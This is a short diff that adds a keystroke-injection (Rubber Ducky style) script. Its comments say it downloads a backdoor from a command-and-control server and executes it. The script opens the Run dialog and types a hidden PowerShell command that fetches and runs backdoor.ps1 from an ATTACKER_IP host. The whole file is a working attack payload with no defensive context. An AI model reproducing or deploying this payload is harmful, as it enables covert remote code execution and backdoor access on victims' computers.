@@ -1,0 +1,8 @@
+REM Download and execute backdoor payload
+REM This script downloads a backdoor from the C2 server and executes it
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:5000/payloads/backdoor.ps1')"
+ENTER
